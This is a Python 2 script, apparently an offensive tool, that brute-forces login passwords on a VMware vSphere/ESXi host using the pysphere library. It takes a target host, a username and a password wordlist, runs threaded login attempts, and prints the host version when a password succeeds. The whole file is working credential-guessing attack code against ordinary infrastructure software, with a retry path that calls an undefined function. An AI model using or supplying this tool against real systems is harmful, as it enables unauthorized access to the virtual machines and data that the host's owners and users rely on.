import optparse
import time
from threading import *
from pysphere import VIServer, VIProperty, MORTypes, VIApiException
from pysphere.resources import VimService_services as VI
from pysphere.vi_task import VITask
import sys

maxConnections = 10
connection_lock = BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0

# Supporting Functions
def setupConnection(host, user, password, release):
        global Found
        global Fails

        try:
                server = VIServer()
                server.connect(host, user, password)
                print "[+] Password Found: " +password
                print "[+] Host: " + host + " Version: " + server.get_server_type() + " " + server.get_api_version() + "\n"
                closeConnection(server)
                Found =  True
        except Exception, err:
                if 'read_nonblocking' in str(err):
                        Fails += 1
                        time.sleep(5)
                        connect(host, user, password, False)
                elif 'synchronize with original prompt' in str(err):
                        time.sleep(1)
                        connect(host, user, password, False)
#               else:
#                       print "error message: " + str(err)
        finally:
                if release: connection_lock.release()

def closeConnection(server):
        server.disconnect()
        return None


def main():
        parser = optparse.OptionParser('usage %prog '+ '-H <target host> -u <user> -F <password list>'
                              )
        parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
        parser.add_option('-F', dest='passwdFile', type='string',\
                help='specify password file')
        parser.add_option('-u', dest='user', type='string',\
                help='specify the user')

        (options, args) = parser.parse_args()
        host = options.tgtHost
        passwdFile = options.passwdFile
        user = options.user

        if host == None or passwdFile == None or user == None:
                print parser.usage
                exit(0)

        fn = open(passwdFile, 'r')
        for line in fn.readlines():

                if Found:
                    print "[*] Exiting: Password Found"
                    exit(0)
                if Fails > 5:
                    print "[!] Exiting: Too Many Socket Timeouts"
                    exit(0)

                connection_lock.acquire()
                password = line.strip('\r').strip('\n')
                print "[-] Testing: "+str(password)
                t = Thread(target=setupConnection, args=(host, user,password, True))
                child = t.start()

if __name__ == '__main__':
    main()

